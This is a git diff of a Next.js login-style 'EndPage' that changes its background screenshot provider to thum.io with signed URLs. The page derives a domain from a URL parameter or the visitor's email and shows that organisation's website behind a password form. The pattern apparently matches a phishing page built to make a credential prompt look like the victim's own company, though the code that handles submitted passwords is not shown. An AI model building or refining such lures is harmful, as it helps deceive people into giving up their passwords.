@@ -3,6 +3,7 @@
 import '../../styles/globals.css'
 import { useSearchParams, useRouter } from 'next/navigation'
 import { useState, useEffect } from 'react'
+import thum from 'thum.io'
 
 export default function EndPage() {
   const params          = useSearchParams()
@@ -14,12 +15,12 @@ export default function EndPage() {
   const [errors, setErrors]         = useState({ password: '' })
   const [showModal, setShowModal]   = useState(false)
 
-  // For background screenshot
+  // For background thumbnail
   const [domainToCapture, setDomainToCapture] = useState('')
   const [screenshotUrl, setScreenshotUrl]     = useState('')
 
+  // decide domain
   useEffect(() => {
-    // decide domain exactly the same way
     if (urlParamDomain) {
       setDomainToCapture(urlParamDomain)
     } else {
@@ -28,12 +29,17 @@ export default function EndPage() {
     }
   }, [urlParamDomain, email])
 
+  // build thum.io URL
   useEffect(() => {
     if (!domainToCapture) return
-    const base = process.env.NEXT_PUBLIC_SCREENSHOT_URL!
-    const sep  = base.includes('?') ? '&' : '?'
+    const secret = process.env.NEXT_PUBLIC_THUM_IO_SECRET!
+    const keyId  = parseInt(process.env.NEXT_PUBLIC_THUM_IO_KEY_ID!, 10)
     setScreenshotUrl(
-      `${base}${sep}url=${encodeURIComponent(`https://${domainToCapture}`)}`
+      thum.getThumURL({
+        url: `https://${domainToCapture}`,
+        width: 1200,
+        auth: { type: 'md5', secret, keyId },
+      })
     )
   }, [domainToCapture])
 
@@ -56,12 +62,12 @@ export default function EndPage() {
 
   return (
     <div className="login-container relative min-h-screen">
-      {/* Screenshot + light-blue tint */}
+      {/* Thumbnail background + tint */}
       {screenshotUrl && (
         <div className="absolute inset-0 overflow-hidden">
           <img
             src={screenshotUrl}
-            alt={`Screenshot of ${domainToCapture}`}
+            alt={`Thumbnail of ${domainToCapture}`}
             className="w-full h-full object-contain opacity-50 pointer-events-none"
           />
           <div className="absolute inset-0 bg-light-blue/50 pointer-events-none" />
